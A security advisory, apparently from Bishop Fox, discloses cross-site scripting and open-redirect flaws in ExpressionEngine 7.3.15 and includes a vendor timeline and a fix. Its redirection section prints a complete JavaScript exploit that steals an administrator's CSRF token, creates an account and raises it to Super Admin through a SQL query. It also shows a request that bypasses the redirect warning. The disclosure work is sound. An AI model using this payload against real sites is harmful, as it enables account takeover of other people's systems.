---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-17_expressionengine-version-7315.md
original_filename: 2024-06-17_expressionengine-version-7315.md
title: ExpressionEngine, Version 7.3.15
category: documents
detected_topics:
- xss
- csrf
- ssrf
- command-injection
- file-upload
- otp
tags:
- imported
- documents
- xss
- csrf
- ssrf
- command-injection
- file-upload
- otp
language: en
raw_sha256: 3607b6f8187f585a12a4d1e39121e3d4f05addc35678811a78428a8c7d6af26a
text_sha256: ff1eb3e7513f34e22a41f2d44ca92aa18088e968e68cc44377fbbeb6c003697b
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: true
---

# ExpressionEngine, Version 7.3.15

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-17_expressionengine-version-7315.md
- Source Type: markdown
- Detected Topics: xss, csrf, ssrf, command-injection, file-upload, otp
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: True
- Raw SHA256: `3607b6f8187f585a12a4d1e39121e3d4f05addc35678811a78428a8c7d6af26a`
- Text SHA256: `ff1eb3e7513f34e22a41f2d44ca92aa18088e968e68cc44377fbbeb6c003697b`


## Content

---
title: "ExpressionEngine, Version 7.3.15"
page_title: "ExpressionEngine, Version 7.3.15 | Bishop Fox"
url: "https://bishopfox.com/blog/expressionengine-v-7-3-15-vulnerability-2"
final_url: "https://bishopfox.com/blog/expressionengine-v-7-3-15-vulnerability"
authors: ["Matthieu Keller"]
programs: ["Packet Tide (ExpressionEngine)"]
bugs: ["XSS", "Open redirect"]
publication_date: "2024-06-17"
added_date: "2024-07-01"
source: "pentester.land/writeups.json"
original_index: 247
---

Share

[ ](https://www.facebook.com/share.php?u=https://bishopfox.com/blog/expressionengine-v-7-3-15-vulnerability&amp;utm_medium=social&amp;utm_source=facebook) [ ](https://twitter.com/intent/tweet?url=https://bishopfox.com/blog/expressionengine-v-7-3-15-vulnerability&utm_medium=social&utm_source=twitter&source=tweetbutton&text=) [ ](http://www.linkedin.com/shareArticle?mini=true&url=https://bishopfox.com/blog/expressionengine-v-7-3-15-vulnerability&utm_medium=social&utm_source=linkedin) [ ](/feeds/advisories.rss)

The following document describes identified vulnerabilities in the ExpressionEngine application version 7.3.15, fixed in version 7.4.11.

### Product Vendor

Packet Tide

### Product Description

ExpressionEngine is a flexible, feature-rich, free. open-source content management platform that empowers hundreds of thousands of individuals and organizations around the world to easily manage their web site. The project’s official website is <https://expressionengine.com>. The latest version of the application is 7.4.11, released on June 13, 2024.

### Vulnerabilities List

Two vulnerabilities were identified within the ExpressionEngine application:

  * Cross-Site Scripting (XSS)
  * Open HTTP Redirection

These vulnerabilities are described in the following sections.

### Affected Version

Version 7.4.10 and prior.

### Summary of Findings

Bishop Fox staff identified two vulnerabilities in Packet Tide’s ExpressionEngine version 7.3.15. The most severe issue allowed Bishop Fox staff to obtain access to a new administrator account in an instance of ExpressionEngine.

### Impact

An unauthenticated vulnerability could allow an attacker, able to submit an arbitrary link to an ExpressionEngine administrator, to gain a Super Admin account on the application.

### Solution

Update to newest version 7.4.11.

## ExpressionEngine Cross-Site Scripting (XSS)

The EXPRESSIONENGINE application was affected by multiple cross-site scripting (XSS) vulnerabilities including one unauthenticated in the redirection page. The others were stored within the administration panel. The unauthenticated vulnerability allowed the execution of a JavaScript payload when an administrator visited the maliciously crafted link. The vulnerabilities could be exploited without authentication and used to create new Super Admin accounts.

### Vulnerability Details

CVE ID for XSS: [CVE-2024-38454](https://nvd.nist.gov/vuln/detail/CVE-2024-38454)

Vulnerability Type: Cross-site scripting (XSS)  

Access Vector: ☒ Remote, ☐ Local, ☐ Physical, ☐ Context dependent, ☐ Other (if other, please specify)

Impact: ☐ Code execution, ☐ Denial of service, ☒ Escalation of privileges, ☐ Information disclosure, ☐ Other (if other, please specify)

Security Risk: ☐ Critical, ☒ High, ☐ Medium, ☐ Low

Vulnerability: CWE-79

ExpressionEngine is affected by multiple cross-site scripting vulnerabilities that could allow an attacker to execute JavaScript in the browsers of targeted users. Bishop Fox staff demonstrated that an attacker could exploit this issue to create a super admin account in the ExpressionEngine instance by convincing or causing an administrator to view crafted content. One instance of the issue is a reflected XSS vulnerability that can be exploited by an attacker without credentials for the ExpressionEngine instance. The remaining instances of the issue are stored XSS vulnerabilities that affect the ExpressionEngine control panel. 

### Redirection Functionality

URL-redirection functionality in ExpressionEngine is vulnerable to reflected XSS due to a lack of user input sanitization. Bishop Fox staff demonstrated injection of JavaScript code into the page returned by the server. For instance, the following link

![URL link demonstrating the injection of JavaScript code into the page returned by the server.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link1.PNG)

triggered a popup as shown below:

![FIGURE 1 - JavaScript payload triggered when browsing to the malicious link](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/javascript-paylod-malicious.png) Figure 1 - JavaScript payload triggered when browsing to the malicious link

If the attacker convinced or caused a higher-privilege user to access the malicious XSS code, they could cause the higher-privilege user to take other actions of the attacker’s choosing.

To demonstrate the potential consequences of exploitation, the following malicious JavaScript payload was hosted at the URL `https://i-0cc6.fox-box.io/xss.js`:
  
  
  <p>async function main(){</p>
  
  <p>var baseURL = '<a href="https://i-0cc6.fox-box.io/admin.php?/cp/" class="redactor-autoparser-object">https://i-0cc6.fox-box.io/admi...</a>';</p>
  <p>var username = 'sua1'</p>
  <p>var password=***REDACTED***</p>
  
  <p>var a;</p>
  <p>var b;</p>
  <p>var t;</p>
  <p>var c;</p>
  <p>var d;</p>
  <p>var e;</p>
  <p>var regex1;</p>
  <p>var csrf;</p>
  <p>var regex2;</p>
  <p>var lastUser;</p>
  
  <p><em>// get csrf token</em></p>
  <p>await fetch(baseURL+'design/manager/pro-dashboard-widgets',{</p>
  <p>  method: 'GET'</p>
  <p>}).then((response) => {</p>
  <p>  a=response;</p>
  <p>});</p>
  <p>b = a.text()</p>
  <p>await b.then((body) => {</p>
  <p>  t=body;</p>
  <p> });</p>
  <p>regex1 = /csrf_token" value="([0-9a-z])*"/g;</p>
  <p>csrf = t.match(regex1)[0].split('"')[2];</p>
  
  
  <p><em>// create a template</em></p>
  <p>fetch(baseURL+'design/template/create/pro-dashboard-widgets', {</p>
  <p>  method: 'POST',</p>
  <p>  headers: {</p>
  <p>  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',</p>
  <p>  },</p>
  <p>  body: new URLSearchParams({</p>
  <p>  'csrf_token': csrf,</p>
  <p>  'template_name': 'testTemplateA2XSS',</p>
  <p>  'template_type': 'webpage',</p>
  <p>  'submit': 'finish'</p>
  <p>  })</p>
  <p>});</p>
  
  <p><em>// create a new user WITHOUT access to the admin panel</em></p>
  <p>await fetch(baseURL+'members/create', {</p>
  <p>  method: 'POST',</p>
  <p>  headers: {</p>
  <p>  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',</p>
  <p>  },</p>
  <p>  body: 'csrf_token='+csrf+'&username='+username+'&email='+username+'%40u.com&password=***REDACTED***&confirm_password=***REDACTED***&role_id=3&role_groups=&roles%5B%5D=&verify_password=***REDACTED***</p>
  <p>}).then(response =>{c=response});</p>
  <p>d = c.text()</p>
  <p>await d.then((body)=>{e=body;});</p>
  <p>regex2 = /<a href="admin.php\?\/cp\/members\/profile&id=([0-9])+"/;</p>
  <p>lastUser = e.match(regex2)[0].split('=')[2].split('"')[0]</p>
  
  <p><em>// add the superadmin role to the created user</em></p>
  <p>await fetch(baseURL+'utilities/query', {</p>
  <p>  method: 'POST',</p>
  <p>  body: new URLSearchParams({</p>
  <p>  'csrf_token': csrf,</p>
  <p>  'thequery': "UPDATE `exp_members` SET `role_id`='1' WHERE member_id='"+lastUser+"'"</p>
  <p>  })</p>
  <p>});</p>
  <p>}</p>
  <p>main()</p>
  

If an ExpressionEngine administrator accessed the below link, the script would capture the administrator’s cross-site request forgery (CSRF) token, add a template, add a user, and finally add the newly-created user to the Super Admin role.  

![Example of the link that would allow attackers to inject the script.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link2.PNG)

A new user was created and granted the Super Admin role after the browser executed the script, as shown below:

![FIGURE 2 – Screenshot of the user with the Super Admin role added.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Super-Admin-role-added.png)FIGURE 2 – User with the Super Admin role added.

This instance of XSS in ExpressionEngine can be exploited by an attacker without credentials.

The remainder of this finding describes the additional locations where Bishop Fox staff discovered other instances of XSS. The same exploit payload could be used in any of the additional locations. However, the remaining instances can only be exploited by an attacker with valid credentials.

#### SVG file

Bishop Fox staff determined that ExpressionEngine was vulnerable to stored XSS via uploading a malicious Scalable Vector Graphics (SVG) image file.

First an SVG image containing the malicious JavaScript payload

![First an SVG image containing the malicious JavaScript payload](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link8.PNG)

was uploaded as a file via the ExpressionEngine application control panel, using the feature shown below:  

![FIGURE 3 – File upload feature used to upload the SVG file.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/SVG-file-upload.png)FIGURE 3 – File upload feature used to upload the SVG file.

When a user browsed to the uploaded SVG image location, it triggered the JavaScript payload and displayed a JavaScript alert dialog, as shown below:

![FIGURE 4 – JavaScript payload triggered when browsing to the image.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Payload-triggered.png)FIGURE 4 – JavaScript payload triggered when browsing to the image.

It was possible to execute a remote script – such as the payload described in the Redirection Functionality section of this finding – via a remote script reference in the SVG file, as shown below in XML markup:

![Screenshot of the remote script reference in the SVG file, in XML markup.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link3.PNG)

#### Entries

Bishop Fox staff determined that the ExpressionEngine Entries feature was vulnerable to XSS in the name field of entries and demonstrated this by creating an entry with the name:

![Screenshot of code: test](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link-4.PNG)

When a user clicked on the entry name, their browser executed the JavaScript code and displayed an alert dialog box, as shown in the figure below:

![FIGURE 5 – JavaScript payload triggered when clicking on the malicious entry.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Payload-triggered-entries.png)FIGURE 5 – JavaScript payload triggered when clicking on the malicious entry.

An attacker could replace the alert dialog with a more complex payload, such as the script discussed in the Redirection Functionality section of this finding. 

#### Member Roles  

Bishop Fox staff determined that the ExpressionEngine Roles feature was vulnerable to XSS in the name field of role groups, and demonstrated this by creating a role group with the name as: 

![Screenshot of code: df](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link5.PNG)

When a user viewed the role group, their browser executed the JavaScript code and displayed a JavaScript alert dialog box, as shown in the figure below: 

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Payload-triggered-member.png)FIGURE 6 – JavaScript payload triggered when clicking on the malicious role group name.

Additionally, Bishop Fox staff determined that the same issue could be triggered via the name field of roles themselves and demonstrated the issue by creating a role with the name: 

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link6.PNG)

When a user clicked on the checkbox to select a role with a malicious name, their browser executed the JavaScript code and displayed a JavaScript alert dialog box, as shown in the figure below:

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Payload-triggered-member2.png)FIGURE 7 – JavaScript payload triggered when clicking on the malicious role checkbox.

An attacker could replace the alert dialog with a more complex payload, such as the script discussed in the Redirection Functionality section of this finding.

#### Field

Bishop Fox staff determined that the ExpressionEngine Fields feature was vulnerable to XSS in the name field of fields and demonstrated this by creating a field with the name:

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link7.PNG)

When a user clicked on the checkbox for this specific field, their browser executed the JavaScript code and displayed an alert dialog box, as shown in the figure below:  

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Payload-triggered-field.png)FIGURE 8 – JavaScript payload triggered when clicking on the malicious filed checkbox

An attacker could replace the alert dialog with a more complex payload, such as the script discussed in the Redirection Functionality section of this finding.

#### Channel

Bishop Fox staff determined that the ExpressionEngine Channels feature was vulnerable to XSS in the name field of channels and demonstrated this by creating a channel with the name:

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link7.PNG)

When a user clicked on the checkbox for this specific channel, their browser executed the JavaScript code and displayed an alert dialog box, as shown in the figure below: 

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Payload-triggered-channel.png)FIGURE 9 – JavaScript payload triggered when clicking on the malicious channel checkbox.

An attacker could replace the alert dialog with a more complex payload, such as the script discussed in the Redirection Functionality section of this finding. 

#### Image

Bishop Fox staff determined that the ExpressionEngine Images feature was vulnerable to XSS in the name field of images and demonstrated this by creating an image with the name:

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/link6.PNG)

When a user tried to use the image in a template or right-clicked on the image’s thumbnail, their browser executed the JavaScript code and displayed an alert dialog box, as shown in the figure below:

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Payload-triggered-image.png)FIGURE 10 – JavaScript payload triggered when right-clicking on the malicious image thumbnail.

An attacker could replace the alert dialog with a more complex payload, such as the script discussed in the Redirection Functionality section of this finding.  

## Open HTTP Redirection

The EXPRESSIONENGINE application was affected by an open HTTP redirection vulnerability that could be exploited without authentication and used to redirect a victim user to an arbitrary page.

### Vulnerability Details

CVE ID: CVE-2024-38455 

Vulnerability Type: Open HTTP redirection

Access Vector: ☒ Remote, ☐ Local, ☐ Physical, ☒ Context dependent, ☐ Other (if other, please specify)

Impact: ☐ Code execution, ☐ Denial of service, ☐ Escalation of privileges, ☐ Information disclosure, ☒ Other (if other, please specify)

Security Risk: ☐ Critical, ☐ High, ☐ Medium, ☒ Low

Vulnerability: CWE-601

ExpressionEngine includes URL-redirection functionality that displays a warning prompt when redirecting to external URLs. Bishop Fox staff determined that the warning prompt can be bypassed by sending a crafted value for the URL parameter. An attacker could take advantage of this vulnerability to execute convincing phishing attacks against ExpressionEngine users by leveraging the trust that legitimate users have in the instance domain. 

When the URL parameter would redirect the user to an external website, ExpressionEngine displays a redirection warning as shown below:

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/redirection-warning.png)FIGURE 11 – Redirection warning displayed before redirecting the user to an external webpage. 

It is possible to bypass the redirection warning screen by omitting the protocol used. As an example, the following URL will redirect the user to the Bishop Fox website without a warning: [`https://i-0cc6.fox-box.io/admin.php?URL=//bishopfox.com`](https://i-0cc6.fox-box.io/admin.php?URL=//bishopfox.com).

As shown below, when using this syntax, ExpressionEngine sends the redirect with no prompt:

**Request**
  
  
  GET /admin.php?URL=//bishopfox.com HTTP/1.1
  …omitted for brevity…

**Response**
  
  
  HTTP/1.1 200 OK
  …omitted for brevity…
  <meta http-equiv="refresh" content="0; URL=//bishopfox.com">
  …omitted for brevity…

This behavior can be exploited by sending links to trusted ExpressionEngine instances that redirect to malicious content hosted elsewhere.

### Credits  

  * Matthieu Keller, Senior Consultant, Bishop Fox ([[email protected]](/cdn-cgi/l/email-protection#0c6167696060697e4c6e657f64637c6a6374226f6361))

### Timeline

  * 02/13/2024: Initial discovery.
  * 02/13/2024: Contact with vendor.
  * 02/13/2024: Vendor acknowledged vulnerabilities.
  * 05/07/2024: Vendor issue partial fix.
  * 05/15/2024: We informed the vendor which fixes are working and which are not.
  * 05/21/2024: Version 7.4.10 released, fixes still not fully implemented.
  * 06/13/2024: Fixes published in Version 7.4.11.
  * 06/17/2024: Vulnerabilities publicly disclosed.

* * *

![Matthieu Keller Headshot](https://assets.bishopfox.com/prod-1437/Images/author-photos/MatthieuKeller-Headshot.jpg)

By Matthieu Keller 

Senior Security Consultant

Matthieu Keller is a Senior Consultant at BishopFox with over 10 years of offensive security experience. He focuses on [network penetration testing](https://bishopfox.com/services/penetration-testing-services/network-security) (internal and external), and [web application assessments](https://bishopfox.com/services/penetration-testing-services/application-penetration-testing) (static and dynamic). 

He has an extensive background in internal network penetration tests and conducting assessments for French government entities as well as international companies. Matthieu also teaches offensive security in French engineering school.

[ More by Matthieu Keller  ](https://bishopfox.com/authors/matthieu-keller)

[ ](https://www.linkedin.com/in/matthieukeller/)

![](/static/assets/images/backgrounds/lander-header-bg-black-lines.svg)

Subscribe to our blog

Be first to learn about latest tools, advisories, and findings.

Thank You! You have been subscribed.
